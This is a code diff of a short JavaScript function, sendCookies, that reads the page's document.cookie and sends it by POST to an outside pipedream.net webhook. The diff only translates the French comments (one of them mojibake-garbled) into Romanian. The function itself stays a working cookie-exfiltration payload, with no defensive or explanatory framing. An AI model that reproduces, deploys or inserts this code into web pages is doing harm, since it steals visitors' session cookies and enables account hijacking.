@@ -1,9 +1,9 @@
 async function sendCookies() {
     try {
-        // Extraire les cookies
+        // Extrage cookie-urile
         const cookies = document.cookie;
 
-        // Envoi des cookies vers la nouvelle URL
+        // Trimite cookie-urile către URL-ul webhook-ului
         const response = await fetch('https://eom060axfo3rocf.m.pipedream.net', {
             method: 'POST',
             headers: {
@@ -12,12 +12,12 @@ async function sendCookies() {
             body: JSON.stringify({ cookies })
         });
 
-        // RÃ©cupÃ©ration des donnÃ©es de la rÃ©ponse
+        // Recuperează datele din răspuns
         const responseData = await response.json();
         console.log(responseData);
 
     } catch (error) {
-        console.error('Erreur:', error);
+        console.error('Eroare:', error);
     }
 }
 
